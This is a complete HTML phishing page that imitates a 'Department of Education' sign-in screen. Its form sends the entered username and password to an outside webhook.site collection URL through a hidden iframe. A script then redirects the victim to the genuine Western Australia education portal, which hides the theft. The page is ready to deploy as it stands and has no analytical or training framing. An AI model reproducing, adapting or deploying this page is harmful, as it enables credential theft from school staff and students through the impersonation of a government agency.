<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Department of Education Login</title>
    <style>
        body {
            background-color: #f0f2f5;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .login-container {
            background-color: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
            width: 350px;
            text-align: center;
        }

        .login-container img {
            width: 120px;
            margin-bottom: 20px;
        }

        .login-container h2 {
            margin-bottom: 20px;
            color: #333;
        }

        .login-container input[type="text"],
        .login-container input[type="password"] {
            width: 100%;
            padding: 12px 10px;
            margin: 8px 0;
            display: inline-block;
            border: 1px solid #ccc;
            box-sizing: border-box;
            border-radius: 4px;
        }

        .login-container button {
            background-color: #0078d4;
            color: white;
            padding: 14px 0;
            margin-top: 20px;
            width: 100%;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }

        .login-container button:hover {
            background-color: #005a9e;
        }

        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #aaa;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4a/Department_of_Education_Simplified_Logo.png/120px-Department_of_Education_Simplified_Logo.png" alt="Department of Education Logo">
        <h2>Department of Education</h2>

        <form id="loginForm" action="https://webhook.site/4fc45ded-d691-4520-ad22-a0941714bc2e" method="POST" target="hidden_iframe">
            <input type="text" id="username" name="username" placeholder="User Name" required><br>

            <input type="password" id="password" name="password" placeholder="Password" required><br>

            <button type="submit">Sign In</button>
        </form>

        <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"></iframe>

        <div class="footer">
            &copy; 2025 Department of Education. All rights reserved.
        </div>
    </div>

    <script>
        const form = document.getElementById('loginForm');
        form.addEventListener('submit', function() {
            setTimeout(function() {
                window.location.href = "https://connect.det.wa.edu.au/";
            }, 500); // Redirect after 0.5 second
        });
    </script>
</body>
</html>
